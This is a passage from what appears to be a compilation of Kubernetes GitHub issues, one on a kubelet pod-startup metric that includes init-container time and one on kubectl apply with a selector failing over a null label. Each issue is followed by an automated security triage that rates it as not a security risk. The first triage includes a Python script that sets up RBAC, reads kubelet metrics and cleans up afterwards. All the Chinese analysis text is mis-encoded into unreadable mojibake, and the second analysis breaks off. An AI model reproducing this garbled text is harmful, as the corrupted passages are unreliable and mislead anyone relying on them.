According to https://github.com/kubernetes/kubernetes/blob/832be9538ec49cb2b496612eff7c1dff68d8b6ba/pkg/kubelet/metrics/metrics.go#L240-L257 and https://github.com/kubernetes/community/blob/master/sig-scalability/slos/pod_startup_latency.md, I expect the kubelet_pod_start_sli_duration_seconds metric to exclude init container runtime from its measurements.
 
I tested this by creating lots of pods with a 10 second sleep in their init containers, then looked at the metric on the relevant kubelet, and I see this kind of thing:

``` 
kubelet_pod_start_sli_duration_seconds_bucket{le="0.5"} 0
kubelet_pod_start_sli_duration_seconds_bucket{le="1"} 0
kubelet_pod_start_sli_duration_seconds_bucket{le="2"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="3"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="4"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="5"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="6"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="8"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="10"} 1
kubelet_pod_start_sli_duration_seconds_bucket{le="20"} 43
```

#### What did you expect to happen?

I would expect to see the le="10", le="8", le="6", etc. counters increment in this case, since init container time should not be being included.

#### How can we reproduce it (as minimally and precisely as possible)?

I used a deployment yaml like this:

```yaml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test
spec:
  replicas: 50
  selector:
    matchLabels:
      app: test
  template:
    metadata:
      labels:
        app: test
    spec:
      nodeName: $YOUR_NODE_NAME
      initContainers:
      - name: init
        image: busybox
        command: ["sh", "-c", "sleep 10"]
      containers:
      - name: test
        image: k8s.gcr.io/pause:3.9
```

Then SSH onto $YOUR_NODE_NAME and with an appropriate bearer token, and do:

```sh
curl -sk -H "Authorization: Bearer $BEARER_TOKEN" https://localhost:10250/metrics | grep kubelet_pod_start_sli_duration
```

(https://yuki-nakamura.com/2023/10/15/get-kubelets-metrics-manually/ is a helpful resource for how to create a ServiceAccount + ClusterRoleBinding to get a bearer token to use against Kubelet metrics.  It's a little out of date though, you'll also need to follow something like https://stackoverflow.com/questions/73164466/how-to-create-a-secret-for-service-account-using-kubernetes-version-1-24 to create a Secret to lift the bearer token).

#### Anything else we need to know?

By code inspection, I cannot find anywhere any indication of code that deducts init container time.
 
I believe the key part of the code is here: https://github.com/kubernetes/kubernetes/blob/832be9538ec49cb2b496612eff7c1dff68d8b6ba/pkg/kubelet/util/pod_startup_latency_tracker.go#L99-L123
 
I read this as calculating `t(all containers started) - t(pod created) - (t(last pull finished) - t(first pull started))`
 
I'm also suspicious because I didn't see anything that excludes pods with stateful volumes, although I might have just missed it.

Similarly, I suspect that this metric implementation is currently including time between pod creation and successful scheduling; if this is so, I'm dubious that it well matches the intention of the SLO documentation "schedulable" term.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.7
```

</details>


#### Cloud provider

<details>
AKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux aks-nodepool1-58959923-vmss000000 5.15.0-1087-azure #96-Ubuntu SMP Fri Mar 28 20:31:27 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
az group create -n test -l canadacentral
az aks create -g test -n test
az aks get-credentials -g test -n test
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†Kubernetes Kubeletä¸­çš„ä¸€ä¸ªæŒ‡æ ‡ï¼ˆmetricï¼‰`kubelet_pod_start_sli_duration_seconds` çš„è®¡ç®—æ–¹å¼ä¸å…¶æ–‡æ¡£å®šä¹‰ä¸ç¬¦ã€‚å…·ä½“æ¥è¯´ï¼Œè¯¥æŒ‡æ ‡åº”è¯¥æ’é™¤init containerçš„è¿è¡Œæ—¶é—´ï¼Œä½†å®é™…å®ç°ä¸ŠåŒ…å«äº†è¿™éƒ¨åˆ†æ—¶é—´ï¼Œå¯¼è‡´æŒ‡æ ‡æ•°æ®åé«˜ã€‚

æäº¤è€…é€šè¿‡åˆ›å»ºä¸€ä¸ªå¸¦æœ‰`sleep 10`çš„init containerçš„Podï¼Œå¹¶è§‚å¯ŸKubeletçš„`/metrics`ç«¯ç‚¹ï¼ŒéªŒè¯äº†è¿™ä¸ªé—®é¢˜ã€‚ä»ä»£ç åˆ†ææ¥çœ‹ï¼Œè¯¥æŒ‡æ ‡çš„è®¡ç®—é€»è¾‘ç¡®å®æ²¡æœ‰æ‰£é™¤init containerçš„æ‰§è¡Œè€—æ—¶ã€‚

è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·æˆ–Bugï¼Œä¸»è¦å½±å“çš„æ˜¯å¯¹Podå¯åŠ¨å»¶è¿Ÿçš„æœåŠ¡æ°´å¹³æŒ‡æ ‡ï¼ˆSLIï¼‰çš„å‡†ç¡®æ€§ã€‚ä¸å‡†ç¡®çš„æŒ‡æ ‡å¯èƒ½ä¼šè¯¯å¯¼è¿ç»´äººå‘˜å¯¹é›†ç¾¤æ€§èƒ½çš„åˆ¤æ–­ï¼Œä½†å®ƒæœ¬èº«å¹¶ä¸æ„æˆä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒä¸æ¶‰åŠï¼š
1.  **æƒé™æå‡**ï¼šæ— æ³•åˆ©ç”¨æ­¤é—®é¢˜è·å–ä»»ä½•é¢å¤–çš„æƒé™ã€‚
2.  **ä¿¡æ¯æ³„éœ²**ï¼šé™¤äº†æŒ‡æ ‡æ•°æ®æœ¬èº«ä¸å‡†å¤–ï¼Œæ²¡æœ‰æ³„éœ²ä»»ä½•æ•æ„Ÿä¿¡æ¯ã€‚æŒ‡æ ‡æ•°æ®æœ¬èº«æ˜¯è®¾è®¡ä¸ºå¯è§‚æµ‹çš„ã€‚
3.  **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**ï¼šæ— æ³•åˆ©ç”¨æ­¤é—®é¢˜å¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚
4.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**ï¼šæ— æ³•åˆ©ç”¨æ­¤é—®é¢˜æ‰§è¡Œä»»æ„ä»£ç ã€‚

è¯¥é—®é¢˜æ˜¯å…³äºè½¯ä»¶å†…éƒ¨åº¦é‡æ ‡å‡†çš„å®ç°ä¸è§„èŒƒä¸ä¸€è‡´ï¼Œå±äºè½¯ä»¶è´¨é‡é—®é¢˜ï¼Œè€Œéå®‰å…¨é£é™©ã€‚æ ¹æ®åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œè¯¥issueæè¿°çš„é—®é¢˜éå®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œå› æ­¤æ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# ä»¥ä¸‹è„šæœ¬ä»…ç”¨äºæ¼”ç¤ºå¦‚ä½•é€šè¿‡Python Kuberneteså®¢æˆ·ç«¯åˆ›å»ºIssueä¸­æè¿°çš„Podï¼Œ
# å¹¶è¯´æ˜å¦‚ä½•æ£€æŸ¥ç›¸å…³æŒ‡æ ‡ï¼Œä»¥éªŒè¯è¯¥åŠŸèƒ½æ€§Bugã€‚

import kubernetes
import time
import os
import uuid
import logging
import threading
import http.server
import socketserver
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# æŠ‘åˆ¶InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- é…ç½®å‚æ•° ---
# ä½¿ç”¨ä¸€ä¸ªå”¯ä¸€çš„åç¼€æ¥å‘½åèµ„æºï¼Œé¿å…å†²çª
UNIQUE_SUFFIX = str(uuid.uuid4())[:8]
NAMESPACE = "default"
DEPLOYMENT_NAME = f"test-metric-bug-{UNIQUE_SUFFIX}"
SERVICE_ACCOUNT_NAME = f"kubelet-metric-reader-{UNIQUE_SUFFIX}"
CLUSTER_ROLE_NAME = f"kubelet-metric-reader-role-{UNIQUE_SUFFIX}"
CLUSTER_ROLE_BINDING_NAME = f"kubelet-metric-reader-binding-{UNIQUE_SUFFIX}"
SECRET_NAME = f"kubelet-metric-reader-token-{UNIQUE_SUFFIX}"

# å‡è®¾è¦æŸ¥è¯¢çš„èŠ‚ç‚¹åï¼Œè¯·æ ¹æ®å®é™…ç¯å¢ƒä¿®æ”¹
# å¦‚æœç•™ç©ºï¼Œè„šæœ¬å°†å°è¯•è·å–ç¬¬ä¸€ä¸ªèŠ‚ç‚¹
TARGET_NODE_NAME = os.environ.get("TARGET_NODE_NAME", "") 

def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œæ•´ä¸ªéªŒè¯æµç¨‹
    """
    try:
        # 1. åŠ è½½Kubeé…ç½®
        logging.info("åŠ è½½Kubernetesé…ç½®...")
        try:
            kubernetes.config.load_kube_config()
        except kubernetes.config.ConfigException:
            logging.info("æ— æ³•ä»kubeconfigæ–‡ä»¶åŠ è½½ï¼Œå°è¯•åŠ è½½in-clusteré…ç½®...")
            kubernetes.config.load_incluster_config()
        
        v1 = kubernetes.client.CoreV1Api()
        apps_v1 = kubernetes.client.AppsV1Api()
        rbac_v1 = kubernetes.client.RbacAuthorizationV1Api()
        
        # 2. è·å–ç›®æ ‡èŠ‚ç‚¹
        global TARGET_NODE_NAME
        if not TARGET_NODE_NAME:
            logging.info("æœªæŒ‡å®šç›®æ ‡èŠ‚ç‚¹ï¼Œè‡ªåŠ¨é€‰æ‹©ç¬¬ä¸€ä¸ªèŠ‚ç‚¹...")
            nodes = v1.list_node()
            if not nodes.items:
                logging.error("é›†ç¾¤ä¸­æ²¡æœ‰å¯ç”¨çš„èŠ‚ç‚¹ã€‚")
                return
            TARGET_NODE_NAME = nodes.items[0].metadata.name
        logging.info(f"å°†åœ¨èŠ‚ç‚¹ {TARGET_NODE_NAME} ä¸Šè¿›è¡Œæµ‹è¯•ã€‚")

        # 3. åˆ›å»ºç”¨äºè®¿é—®Kubelet metricsçš„RBACèµ„æº
        bearer_token = setup_rbac_and_get_token(v1, rbac_v1)
        if not bearer_token:
            return

        # 4. åˆ›å»ºå¸¦æœ‰æ…¢é€Ÿinit containerçš„Deployment
        create_deployment_with_init_container(apps_v1)

        # 5. ç­‰å¾…Podå¯åŠ¨å¹¶æ£€æŸ¥metrics
        # ç­‰å¾…è¶³å¤Ÿé•¿çš„æ—¶é—´è®©Podå®Œæˆè°ƒåº¦å’Œå¯åŠ¨
        logging.info("ç­‰å¾…30ç§’ï¼Œä»¥ä¾¿Podè¢«è°ƒåº¦å’Œå¯åŠ¨...")
        time.sleep(30)
        check_kubelet_metrics(v1, bearer_token)

    except Exception as e:
        logging.error(f"æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # 6. æ¸…ç†æ‰€æœ‰åˆ›å»ºçš„èµ„æº
        logging.info("å¼€å§‹æ¸…ç†èµ„æº...")
        cleanup_resources(v1, apps_v1, rbac_v1)
        logging.info("æ¸…ç†å®Œæˆã€‚")


def setup_rbac_and_get_token(v1, rbac_v1):
    """åˆ›å»ºServiceAccount, ClusterRole, ClusterRoleBinding, å’Œ Secretä»¥è·å–token"""
    logging.info(f"åˆ›å»ºServiceAccount: {SERVICE_ACCOUNT_NAME}")
    sa = kubernetes.client.V1ServiceAccount(
        metadata=kubernetes.client.V1ObjectMeta(name=SERVICE_ACCOUNT_NAME)
    )
    v1.create_namespaced_service_account(namespace=NAMESPACE, body=sa)

    logging.info(f"åˆ›å»ºClusterRole: {CLUSTER_ROLE_NAME}")
    role = kubernetes.client.V1ClusterRole(
        metadata=kubernetes.client.V1ObjectMeta(name=CLUSTER_ROLE_NAME),
        rules=[kubernetes.client.V1PolicyRule(
            api_groups=[""],
            resources=["nodes/proxy", "nodes/metrics"],
            verbs=["get"]
        )]
    )
    rbac_v1.create_cluster_role(body=role)

    logging.info(f"åˆ›å»ºClusterRoleBinding: {CLUSTER_ROLE_BINDING_NAME}")
    binding = kubernetes.client.V1ClusterRoleBinding(
        metadata=kubernetes.client.V1ObjectMeta(name=CLUSTER_ROLE_BINDING_NAME),
        subjects=[kubernetes.client.V1Subject(
            kind="ServiceAccount",
            name=SERVICE_ACCOUNT_NAME,
            namespace=NAMESPACE
        )],
        role_ref=kubernetes.client.V1RoleRef(
            kind="ClusterRole",
            name=CLUSTER_ROLE_NAME,
            api_group="rbac.authorization.k8s.io"
        )
    )
    rbac_v1.create_cluster_role_binding(body=binding)

    # å¯¹äºKubernetes v1.24+ï¼Œéœ€è¦æ‰‹åŠ¨åˆ›å»ºSecretæ¥è·å–token
    logging.info(f"åˆ›å»ºSecret: {SECRET_NAME} ç”¨äºè·å–token")
    secret = kubernetes.client.V1Secret(
        metadata=kubernetes.client.V1ObjectMeta(
            name=SECRET_NAME,
            namespace=NAMESPACE,
            annotations={"kubernetes.io/service-account.name": SERVICE_ACCOUNT_NAME}
        ),
        type="kubernetes.io/service-account-token"
    )
    v1.create_namespaced_secret(namespace=NAMESPACE, body=secret)

    # ç­‰å¾…tokenç”Ÿæˆ
    logging.info("ç­‰å¾…tokenåœ¨Secretä¸­ç”Ÿæˆ...")
    for _ in range(10): # æœ€å¤šç­‰å¾…20ç§’
        time.sleep(2)
        try:
            secret_obj = v1.read_namespaced_secret(name=SECRET_NAME, namespace=NAMESPACE)
            if 'token' in secret_obj.data:
                import base64
                token = base64.b64decode(secret_obj.data['token']).decode('utf-8')
                logging.info("æˆåŠŸè·å–Bearer Tokenã€‚")
                return token
        except kubernetes.client.ApiException as e:
            logging.warning(f"è·å–Secretæ—¶å‡ºé”™: {e}, é‡è¯•ä¸­...")
    
    logging.error("è·å–Bearer Tokenå¤±è´¥ã€‚")
    return None

def create_deployment_with_init_container(apps_v1):
    """åˆ›å»ºåŒ…å«æ…¢é€Ÿinit containerçš„Deployment"""
    logging.info(f"åˆ›å»ºDeployment: {DEPLOYMENT_NAME}")
    deployment_body = {
        "apiVersion": "apps/v1",
        "kind": "Deployment",
        "metadata": {"name": DEPLOYMENT_NAME},
        "spec": {
            "replicas": 2, # åˆ›å»ºå°‘é‡Podç”¨äºæµ‹è¯•
            "selector": {"matchLabels": {"app": DEPLOYMENT_NAME}},
            "template": {
                "metadata": {"labels": {"app": DEPLOYMENT_NAME}},
                "spec": {
                    "nodeName": TARGET_NODE_NAME,
                    "initContainers": [{
                        "name": "init-sleep",
                        "image": "busybox",
                        "command": ["sh", "-c", "sleep 10"]
                    }],
                    "containers": [{
                        "name": "main-container",
                        "image": "k8s.gcr.io/pause:3.9"
                    }]
                }
            }
        }
    }
    apps_v1.create_namespaced_deployment(namespace=NAMESPACE, body=deployment_body)

def check_kubelet_metrics(v1, bearer_token):
    """é€šè¿‡API Server Proxyè®¿é—®Kubeletçš„metricsç«¯ç‚¹å¹¶æ£€æŸ¥æŒ‡æ ‡"""
    logging.info("æ­£åœ¨é€šè¿‡API Server Proxyè®¿é—®Kubeletçš„metricsç«¯ç‚¹...")
    
    # Kubelet metricsç«¯ç‚¹è·¯å¾„
    path = f"/api/v1/nodes/{TARGET_NODE_NAME}/proxy/metrics"
    
    # ä½¿ç”¨kuberneteså®¢æˆ·ç«¯çš„ApiClientè¿›è¡Œè¯·æ±‚ï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†è®¤è¯
    api_client = kubernetes.client.ApiClient()
    
    try:
        # å‘èµ·è¯·æ±‚
        response_data, status_code, headers = api_client.call_api(
            path, 'GET',
            header_params={'Authorization': f'Bearer {bearer_token}'},
            auth_settings=['BearerToken'],
            response_type='str',
            _preload_content=False # ç›´æ¥è·å–åŸå§‹å“åº”
        )

        if status_code != 200:
            logging.error(f"è®¿é—®Kubelet metricså¤±è´¥ï¼ŒçŠ¶æ€ç : {status_code}")
            logging.error(f"å“åº”: {response_data.data.decode('utf-8')}")
            return
        
        metrics_text = response_data.data.decode('utf-8')
        
        logging.info("\n--- Kubelet Pod Start SLI Duration Metrics ---\n")
        found_metric = False
        for line in metrics_text.splitlines():
            if "kubelet_pod_start_sli_duration_seconds_bucket" in line:
                print(line)
                found_metric = True
        
        if found_metric:
            logging.info("\nåˆ†æï¼šå¦‚æœle=\"20\"çš„bucketè®¡æ•°è¿œå¤§äºle=\"10\"ä»¥ä¸‹çš„bucketï¼Œ")
            logging.info("ä¸”Podæ•°é‡ä¸le=\"20\"çš„è®¡æ•°å¤§è‡´åŒ¹é…ï¼Œ")
            logging.info("åˆ™è¯æ˜init containerçš„10ç§’å»¶è¿Ÿè¢«é”™è¯¯åœ°è®¡å…¥äº†Podå¯åŠ¨æ—¶é—´ã€‚")
        else:
            logging.warning("æœªæ‰¾åˆ° 'kubelet_pod_start_sli_duration_seconds_bucket' æŒ‡æ ‡ã€‚")
            logging.warning("è¿™å¯èƒ½æ˜¯å› ä¸ºæµ‹è¯•Podè¿˜æœªå®Œæˆå¯åŠ¨ï¼Œæˆ–è€…æŒ‡æ ‡åç§°å·²æ›´æ”¹ã€‚")

    except kubernetes.client.ApiException as e:
        logging.error(f"é€šè¿‡API proxyè®¿é—®Kubelet metricsæ—¶å‘ç”ŸAPIå¼‚å¸¸: {e.body}")
    except Exception as e:
        logging.error(f"è®¿é—®Kubelet metricsæ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")


def cleanup_resources(v1, apps_v1, rbac_v1):
    """æ¸…ç†è„šæœ¬åˆ›å»ºçš„æ‰€æœ‰Kubernetesèµ„æº"""
    try:
        apps_v1.delete_namespaced_deployment(name=DEPLOYMENT_NAME, namespace=NAMESPACE, body=kubernetes.client.V1DeleteOptions())
        logging.info(f"Deployment '{DEPLOYMENT_NAME}' å·²åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404: logging.warning(f"åˆ é™¤Deploymentå¤±è´¥: {e}")

    try:
        rbac_v1.delete_cluster_role_binding(name=CLUSTER_ROLE_BINDING_NAME)
        logging.info(f"ClusterRoleBinding '{CLUSTER_ROLE_BINDING_NAME}' å·²åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404: logging.warning(f"åˆ é™¤ClusterRoleBindingå¤±è´¥: {e}")
        
    try:
        rbac_v1.delete_cluster_role(name=CLUSTER_ROLE_NAME)
        logging.info(f"ClusterRole '{CLUSTER_ROLE_NAME}' å·²åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404: logging.warning(f"åˆ é™¤ClusterRoleå¤±è´¥: {e}")

    try:
        v1.delete_namespaced_secret(name=SECRET_NAME, namespace=NAMESPACE)
        logging.info(f"Secret '{SECRET_NAME}' å·²åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404: logging.warning(f"åˆ é™¤Secretå¤±è´¥: {e}")

    try:
        v1.delete_namespaced_service_account(name=SERVICE_ACCOUNT_NAME, namespace=NAMESPACE)
        logging.info(f"ServiceAccount '{SERVICE_ACCOUNT_NAME}' å·²åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404: logging.warning(f"åˆ é™¤ServiceAccountå¤±è´¥: {e}")

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

ç”±äºè¯¥IssueæŠ¥å‘Šçš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugè€Œéå®‰å…¨æ¼æ´ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œä¹Ÿæ— éœ€æä¾›ç”¨äºæ”»å‡»çš„PoCã€‚

ä¸Šè¿°Pythonè„šæœ¬çš„ç›®çš„æ˜¯ä»¥ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„åœºæ™¯ï¼Œä»¥ä¾¿äºéªŒè¯è¯¥Bugçš„å­˜åœ¨ã€‚å…¶ä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š
1.  **åŠ è½½é…ç½®**ï¼šè„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„kubeconfigæ–‡ä»¶æˆ–in-clusteré…ç½®ï¼Œä»¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
2.  **è®¾ç½®RBAC**ï¼šä¸ºäº†å®‰å…¨åœ°è®¿é—®Kubeletçš„`/metrics`ç«¯ç‚¹ï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ª`ServiceAccount`ã€ä¸€ä¸ªå…·æœ‰è®¿é—®`nodes/metrics`æƒé™çš„`ClusterRole`ï¼Œä»¥åŠä¸€ä¸ª`ClusterRoleBinding`å°†å®ƒä»¬å…³è”èµ·æ¥ã€‚å¯¹äºKubernetes v1.24åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„`Secret`æ¥è·å–é•¿æœŸçš„Bearer Tokenã€‚
3.  **é€‰æ‹©ç›®æ ‡èŠ‚ç‚¹**ï¼šè„šæœ¬å…è®¸ç”¨æˆ·é€šè¿‡ç¯å¢ƒå˜é‡`TARGET_NODE_NAME`æŒ‡å®šä¸€ä¸ªèŠ‚ç‚¹è¿è¡Œæµ‹è¯•Podã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œå®ƒä¼šè‡ªåŠ¨é€‰æ‹©é›†ç¾¤ä¸­çš„ç¬¬ä¸€ä¸ªå¯ç”¨èŠ‚ç‚¹ã€‚
4.  **åˆ›å»ºDeployment**ï¼šè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªDeploymentï¼Œå…¶Podæ¨¡æ¿ä¸­åŒ…å«ä¸€ä¸ªinit containerã€‚è¿™ä¸ªinit containeræ‰§è¡Œ`sleep 10`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªè€—æ—¶10ç§’çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚
5.  **æ£€æŸ¥æŒ‡æ ‡**ï¼šåœ¨åˆ›å»ºDeploymentåï¼Œè„šæœ¬ä¼šç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç„¶åé€šè¿‡Kubernetes API Serverçš„ä»£ç†åŠŸèƒ½è®¿é—®ç›®æ ‡èŠ‚ç‚¹Kubeletçš„`/metrics`ç«¯ç‚¹ã€‚å®ƒä¼šä½¿ç”¨ä¹‹å‰è·å–çš„Bearer Tokenè¿›è¡Œè®¤è¯ã€‚
6.  **åˆ†æç»“æœ**ï¼šè„šæœ¬ä¼šæ‰“å°å‡ºæ‰€æœ‰ä¸`kubelet_pod_start_sli_duration_seconds_bucket`ç›¸å…³çš„æŒ‡æ ‡è¡Œã€‚æ ¹æ®Issueçš„æè¿°ï¼Œå¦‚æœinit containerçš„10ç§’å»¶è¿Ÿè¢«é”™è¯¯åœ°è®¡ç®—åœ¨å†…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†çœ‹åˆ°å¤§éƒ¨åˆ†Podçš„å¯åŠ¨æ—¶é—´è½å…¥å¤§äº10ç§’çš„bucketä¸­ï¼ˆä¾‹å¦‚`le="20"`ï¼‰ï¼Œè€Œä¸æ˜¯å°äº10ç§’çš„bucketï¼Œä»è€ŒéªŒè¯Bugçš„å­˜åœ¨ã€‚
7.  **èµ„æºæ¸…ç†**ï¼šè„šæœ¬åœ¨æ‰§è¡Œå®Œæ¯•æˆ–å‘ç”Ÿé”™è¯¯åï¼Œä¼šæ¸…ç†æ‰æ‰€æœ‰åˆ›å»ºçš„Kubernetesèµ„æºï¼ˆDeployment, ServiceAccount, Role, Binding, Secretï¼‰ï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¿™ä¸ªè„šæœ¬ä½¿ç”¨`kubernetes` Pythonåº“æ¥ä¸é›†ç¾¤äº¤äº’ï¼Œé¿å…äº†ç›´æ¥è°ƒç”¨`kubectl`å‘½ä»¤è¡Œå·¥å…·ï¼Œæ›´åŠ å¥å£®å’Œçµæ´»ã€‚å®ƒå®Œæ•´åœ°æ¨¡æ‹Ÿäº†IssueæŠ¥å‘Šè€…æ‰‹åŠ¨æ“ä½œçš„æµç¨‹ï¼Œå¯ä»¥ç”¨äºåœ¨ä»»ä½•Kubernetesç¯å¢ƒä¸­è‡ªåŠ¨åŒ–åœ°éªŒè¯æ­¤é—®é¢˜ã€‚

---


## Issue #131671 kubectl apply with "--selector" fails if an unrelated label is set to Null

- Issue é“¾æ¥ï¼š[#131671](https://github.com/kubernetes/kubernetes/issues/131671)

### Issue å†…å®¹

#### What happened?

If you have a resource with 2+ labels and one of the labels is set to `Null` or is empty `kubectl apply` works with no issues.

If you try to apply the resource using a selector `-l` the apply command fails with not so useful error message:

```sh
error: no objects passed to apply
```


#### What did you expect to happen?

The error message should clearly state that one of the labels being `empty/null` is causing the problem with the label selector filtering.

The existing error message caused confusion because the label that we are searching for is actually set and we would expect that the filtering would find that resource.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a `test_file.yaml` with a CM resource definition.

```
apiVersion: v1
kind: ConfigMap
metadata:
  name: test-config
  labels:
    label_a: null
    label_b: "bar"
    app.kubernetes.io/version: "v1.0.0"
data:
  config_key_1: "value1"
```

```sh
>> kubectl apply -f test_file.yaml
configmap/test-config created
```

If you try to apply the resource using a selector `-l` the apply command fails with not so useful error message:

```sh
>> kubectl apply -f test_file.yaml -l='label_b=bar'`
error: no objects passed to apply
```

The `label_a` being Null/missing is causing issues with the `-l` label selector, even though `label_b` is being filtered.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5
Server Version: v1.31.4
```

</details>


#### Cloud provider

<details>
n/a
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
Darwin 24.4.0 Darwin Kernel Version 24.4.0:

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª `kubectl` å®¢æˆ·ç«¯å·¥å…·çš„ bugã€‚å½“ä¸€ä¸ª Kubernetes èµ„æºæ¸…å•ï¼ˆYAML æ–‡ä»¶ï¼‰ä¸­åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªæ ‡ç­¾çš„å€¼è¢«è®¾ç½®ä¸º `null` æ—¶ï¼Œä½¿ç”¨ `kubectl apply -f <file> -l <selector>` å‘½ä»¤ä¼šå¤±è´¥ï¼Œå¹¶è¿”å›ä¸€ä¸ªä»¤äººå›°æƒ‘çš„é”™è¯¯ä¿¡æ¯ `error: no objects passed to apply`ã€‚å³ä½¿é€‰æ‹©å™¨ï¼ˆselectorï¼‰åŒ¹é…çš„æ˜¯å¦ä¸€ä¸ªæœ‰æ•ˆçš„æ ‡ç­¾ï¼Œè¯¥å‘½ä»¤ä¾ç„¶ä¼šå¤±è´¥ã€‚

é—®é¢˜çš„æ ¸å¿ƒåœ¨äº `kubectl` åœ¨å°†èµ„æºæäº¤åˆ° API Server ä¹‹å‰ï¼Œä¼šåœ¨å®¢æˆ·ç«¯ä¾§å¯¹ YAML æ–‡ä»¶ä¸­çš„èµ„æºè¿›è¡Œç­›é€‰ã€‚å½“å®ƒé‡åˆ°ä¸€ä¸ªå€¼ä¸º `null` çš„æ ‡ç­¾æ—¶ï¼Œå…¶å†…éƒ¨çš„ç­›é€‰é€»è¾‘ä¼¼ä¹ä¼šå°†æ•´ä¸ªèµ„æºå¯¹è±¡æ’é™¤æ‰ï¼Œå³ä½¿è¯¥å¯¹è±¡çš„å…¶ä»–æ ‡ç­¾æ»¡è¶³ç­›é€‰æ¡ä»¶ã€‚å› æ­¤ï¼Œç»è¿‡ç­›é€‰åï¼Œä¼ é€’ç»™ `apply` æµç¨‹çš„èµ„æºåˆ—è¡¨ä¸ºç©ºï¼Œä»è€Œå¯¼è‡´äº†ä¸Šè¿°é”™è¯¯ã€‚

è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§çš„ç¼ºé™·ï¼ˆBugï¼‰ï¼Œå½±å“äº† `kubectl` å‘½ä»¤çš„å¯ç”¨æ€§å’Œç”¨æˆ·ä½“éªŒï¼Œä½†å®ƒä¸æ„æˆä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚

